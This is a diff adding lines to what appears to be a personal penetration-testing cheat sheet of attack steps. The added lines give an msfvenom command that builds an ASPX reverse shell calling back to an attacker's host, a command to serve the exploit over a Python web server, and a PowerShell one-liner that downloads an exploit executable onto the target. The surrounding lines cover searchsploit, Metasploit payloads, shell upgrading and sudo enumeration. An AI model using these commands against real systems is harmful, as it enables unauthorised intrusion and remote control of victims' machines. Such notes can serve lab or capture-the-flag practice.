@@ -8,5 +8,8 @@ wget and review
 searchsploit <cve>
 searchsploit -m <#>
 from metasploit exploit, set payload
+create reverse shell aspx, msfvenom -p <windows||linux>/shell_reverse_tcp -f aspx LHOST=<yourIP> LPORT=<port> -o shell.aspx
+start webserver to host exploit: python2 -m SimpleHTTPServer
+download exploit via cmd: powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<yourIP>:8000/<exploit>.exe', 'c:\Users\Public\Downloads\<exploit>.exe')"
 from shell, python -c import pty;pty.spawn(''/bin/bash'')
 from user, sudo -l
